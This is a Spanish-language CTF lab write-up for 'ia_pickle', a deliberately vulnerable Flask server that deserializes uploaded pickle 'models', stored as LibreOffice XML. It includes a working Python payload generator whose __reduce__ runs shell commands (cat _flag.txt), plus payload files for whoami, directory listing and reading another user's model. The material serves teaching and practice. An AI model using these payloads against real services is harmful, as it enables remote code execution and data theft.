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13d8c1"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="0013d8c1"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:paragraph-rsid="0013d8c1"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2"/>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="normal" officeooo:paragraph-rsid="0013d8c1" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3"/>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000b3ca7" officeooo:paragraph-rsid="000b3ca7"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="00157069"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0013d8c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d8c1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0b3ca7"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="000f73f7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font-weight="normal" officeooo:rsid="0013d8c1" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-size="11pt" officeooo:rsid="0013d8c1" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="0013d8c1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localhost:58080</text:p>
      <text:p text:style-name="Standard">Inteligencia Artificial mal protegida</text:p>
      <text:p text:style-name="Standard">Python + ML lib + Flask</text:p>
      <text:p text:style-name="Standard">-Estructura base del reto "ia_pickle" extendido con segunda flag:</text:p>
      <text:p text:style-name="Standard"><text:tab/> Fase 1: RCE por deserialización</text:p>
      <text:p text:style-name="Standard"><text:tab/> Fase 2: Exploración del sistema y extracción de modelos para obtener una flag secundaria</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Escenario simulado</text:h>
      <text:p text:style-name="Text_20_body">Un servidor de predicción de Machine Learning expone una funcionalidad web para:</text:p>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P1">Subir archivos <text:span text:style-name="Source_20_Text">.pkl</text:span> (modelos) formato binario de <text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Pickle</text:span></text:span> en Python</text:p>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P1"><text:span text:style-name="Source_20_Text">pickle</text:span> permite serializar y deserializar objetos en Python (guardarlos y cargarlos desde archivos).<text:line-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Vulnerabilidad:</text:span></text:span> si deserializas un archivo creado por un atacante, este puede incluir código malicioso que se ejecuta al cargarlo.</text:p>
            </text:list-header>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P1">Ejecutarlos para hacer "predicciones"</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:h text:style-name="P3" text:outline-level="2">Descripción general del flujo (workflow)</text:h>
      <text:p text:style-name="Text_20_body">El servidor expone dos funcionalidades principales:</text:p>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">/upload</text:span> (POST): Permite a los usuarios subir un archivo <text:span text:style-name="Source_20_Text">.pkl</text:span>, que se guarda como <text:span text:style-name="Source_20_Text">models/model.pkl</text:span>.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">/predict</text:span> (GET): Carga el archivo <text:span text:style-name="Source_20_Text">models/model.pkl</text:span> utilizando <text:span text:style-name="Source_20_Text">pickle.load()</text:span> y muestra el contenido deserializado como "predicción".</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4">En Python, <text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">un objeto es </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Emphasis"><text:span text:style-name="T3">serializable</text:span></text:span></text:span> cuando puede ser convertido a una secuencia de bytes que luego se puede guardar en un archivo o transmitir por red, y posteriormente ser reconstruido (deserializado) exactamente como era originalmente.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"><text:span text:style-name="T1">El servidor </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">no ejecuta ninguna lógica de predicción de IA real</text:span></text:span><text:span text:style-name="T1">, simplemente </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">deserializa y muestra el contenido</text:span></text:span><text:span text:style-name="T1"> del objeto </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">.pkl</text:span></text:span><text:span text:style-name="T1"> subido.</text:span></text:p>
      <text:p text:style-name="P5">Si se quisiera hacer que el sistema hiciera predicciones reales:</text:p>
      <text:list text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P6">Se debería usar una librería como <text:span text:style-name="Source_20_Text">joblib</text:span> o <text:span text:style-name="Source_20_Text">sklearn</text:span> para guardar y cargar modelos entrenados.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">Debería haber una interfaz para subir datos de entrada (por ejemplo, campos de un formulario).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">El servidor debería tener las clases de los modelos importadas para permitir la deserialización segura.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:soft-page-break/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ia_pickle/</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text">├── app.py <text:s text:c="13"/># Servidor Flask con endpoints vulnerables</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text">├── requirements.txt <text:s text:c="7"/># Dependencias de Python</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text">├── Dockerfile <text:s text:c="13"/># Imagen Docker para el servidor</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text">├── docker-compose.yml <text:s text:c="5"/># Orquestador del contenedor</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text">├── prepare.bash <text:tab/><text:tab/> <text:s text:c="2"/># </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Genera</text:span></text:span><text:span text:style-name="Source_20_Text"> la flag y preparar el entorno</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text">├── start.bash <text:s text:c="13"/># Script para levantar el contenedor</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text">├── stop.bash <text:s text:c="6"/># Script para detener y eliminar el contenedor</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text">├── _instance <text:s/># Nombre de la instancia (generado automáticamente)</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text">├── .env <text:s text:c="8"/><text:tab/> <text:s/># Variables de entorno, incluyendo el puerto</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text">├── _flag.txt <text:s text:c="2"/><text:tab/> # Flag del reto (generada automáticamente)</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text">├── models/ <text:s text:c="3"/><text:tab/><text:tab/> # Carpeta donde se suben los modelos .pkl</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text">├── templates/</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>└── form.html <text:tab/># </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">P</text:span></text:span><text:span text:style-name="Source_20_Text">ara subir el modelo y probar la predicción</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text">└── models/ </text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>└── list_models.pkl</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>└── read_flag1.pkl</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>└── exec_whoami.pkl</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:s text:c="4"/>└── read_flag2_from_model.pkl</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"/></text:p>
      <text:p text:style-name="Standard">Este reto está montado para simular un servidor que permite a los usuarios subir sus propios modelos para luego usarlos en predicciones.</text:p>
      <text:p text:style-name="Standard">El problema es que no valida ni protege correctamente esos archivos, por lo tanto, si el atacante sube un archivo .pkl malicioso (modelo con código embebido), el servidor lo carga automáticamente y ejecuta el código malicioso.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Un escenario real donde:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="4"/>Una empresa o plataforma ofrece un servicio automático de predicciones.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="4"/>Los usuarios suben sus propios modelos .pkl para que se usen en el backend.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="4"/>El backend tiene una funcionalidad como:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="8"/>“Sube tu modelo entrenado”</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="8"/>“Te lo probamos”</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="4"/>Pero el backend usa pickle.load() directamente en los archivos subid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te reto contiene <text:span text:style-name="T5">dos fases</text:span>:</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/></text:p>
      <text:p text:style-name="Standard">Fase 1: Vulnerabilidad de deserialización con Pickle</text:p>
      <text:p text:style-name="Standard">- El servidor permite subir modelos `.pkl`</text:p>
      <text:p text:style-name="Standard">- Usa `pickle.load()` sin validar</text:p>
      <text:p text:style-name="Standard">- El atacante puede ejecutar comandos en el servidor (RCE)</text:p>
      <text:p text:style-name="Standard">- <text:span text:style-name="T5">La Flag1 </text:span>se encuentra en `_flag.txt`</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Fase 2: Acceso lateral: robo de modelos ajenos</text:p>
      <text:p text:style-name="Standard">- Hay múltiples modelos ya cargados de otros usuarios en `/models`</text:p>
      <text:p text:style-name="Standard">- El atacante puede listarlos desde su shell (`ls models/`)</text:p>
      <text:p text:style-name="Standard">- Uno de ellos (`admin_model.pkl`) contiene la <text:span text:style-name="T5">Flag2</text:span> serializada</text:p>
      <text:p text:style-name="Standard">- El atacante debe hacer `pickle.load(open("models/admin_model.pkl"))` desde un shell para verla</text:p>
      <text:p text:style-name="Standard">- <text:span text:style-name="T5">Flag2</text:span> se encuentra en `_flag2.txt`</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Comandos de uso</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">bash prepare.bash <text:s text:c="5"/># prepara el entorno, flags y modelos</text:p>
      <text:p text:style-name="Standard">bash start.bash <text:s text:c="7"/># levanta el contenedor</text:p>
      <text:p text:style-name="Standard">bash stop.bash <text:s text:c="8"/># lo detiene</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">Ataque</text:p>
      <text:p text:style-name="Standard">1. Crear y subir un `.pkl` malicioso que haga `subprocess.check_output(['ls', 'models'])`</text:p>
      <text:p text:style-name="Standard">2. Observar que existe `admin_model.pkl`</text:p>
      <text:p text:style-name="Standard">3. Crear y subir otro `.pkl` que ejecute: `pickle.load(open('models/admin_model.pkl', 'rb'))`</text:p>
      <text:p text:style-name="Standard">4. Obtener la segunda flag como resultado del `__repr__`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Strong_20_Emphasis"><text:span text:style-name="T6">Explotación de la vulnerabilidad (fase 1)</text:span></text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T6"/></text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T7">Crear archivo </text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">.pkl</text:span></text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T7"> malicioso que lea la flag:</text:span></text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T7"/></text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"># crear_payload.py</text:span></text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">import pickle</text:span></text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">import subprocess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class Evil:</text:span></text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="4"/>def __reduce__(self):</text:span></text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="8"/>return (subprocess.check_output, (["cat", "_flag.txt"],)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with open("evil.pkl", "wb") as f:</text:span></text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="4"/>pickle.dump(Evil(), f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print("evil.pkl creado.")</text:span></text:span></text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"/></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T9">Creas el archivo mediante py (evil.pkl)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python</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">3</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"> crear_payload.py</text:span></text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"/></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T9"><text:s/>Se sube en la web y se le da a predecir</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T9"/></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T9"/></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11">Exploración para descubrir la segunda fase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/></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11">█████████████████████████████████████████████████</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11">█ <text:s text:c="16"/>📁 CRACK TOOLS <text:s text:c="15"/>█</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11">█ <text:s text:c="10"/>Archivos .pkl para explotar <text:s text:c="7"/>█</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11">█ <text:s text:c="10"/>el reto vulnerable ia_pickle <text:s text:c="6"/>█</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11">█████████████████████████████████████████████████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📝 Todos los archivos fueron generados para probar y explotar</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11">las fases del reto CTF "ia_pickle", que simula un entorno </text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11">vulnerable de deserialización con Pickle en Python.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━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━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📂 ARCHIVOS INCLUIDOS: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1️⃣ <text:s/>exec_whoami.pkl</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11"><text:s text:c="5"/>- Ejecuta el comando 'whoami' dentro del contenedor</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11"><text:s text:c="5"/>- Verifica que tienes ejecución remota (RCE)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2️⃣ <text:s/>read_flag1.pkl</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11"><text:s text:c="5"/>- Ejecuta 'cat _flag.txt'</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11"><text:s text:c="5"/>- Devuelve la primera flag del reto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3️⃣ <text:s/>list_models.pkl</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11"><text:s text:c="5"/>- Ejecuta 'ls -la models/'</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11"><text:s text:c="5"/>- Lista el contenido del directorio de modelos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4️⃣ <text:s/>read_flag2_from_model.pkl</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11"><text:s text:c="5"/>- Ejecuta un script Python que deserializa</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11"><text:s text:c="7"/>el archivo 'models/admin_model.pkl'</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11"><text:s text:c="5"/>- Extrae la segunda flag embebida en su __repr__()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━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━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💡 ¿Cómo usar?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1. Levanta el entorno normalmente con:</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11"><text:s text:c="3"/>bash prepare.bash</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11"><text:s text:c="3"/>bash start.bash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2. Accede a: http://localhost:58080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3. Desde el formulario web, selecciona uno de los .pkl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4. Pulsa "Probar predicción"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5. Verás el resultado de la ejecución (comando o flag)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━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━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🎯 ¿Qué se demuestra?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- Deserialización insegura con Pickle</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11">- RCE (Remote Code Execution)</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11">- Enumeración de archivos</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11">- Movimiento lateral y extracción de datos sensibles</text:span></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11"/></text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T11">█████████████████████████████████████████████████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fo:color="#158466" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-family="'Liberation Mono'" style:font-family-generic="modern" style:font-pitch="fixed" fo:background-color="#dee7e5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5.2$Linux_X86_64 LibreOffice_project/03d19516eb2e1dd5d4ccd751a0d6f35f35e08022</meta:generator>
    <dc:date>2025-04-07T19:25:11.585732082</dc:date>
    <meta:editing-duration>P2DT5H23M16S</meta:editing-duration>
    <meta:editing-cycles>7</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="5" meta:paragraph-count="124" meta:word-count="888" meta:character-count="6395" meta:non-whitespace-character-count="5338"/>
  </office:meta>
</office:document-meta>
</file>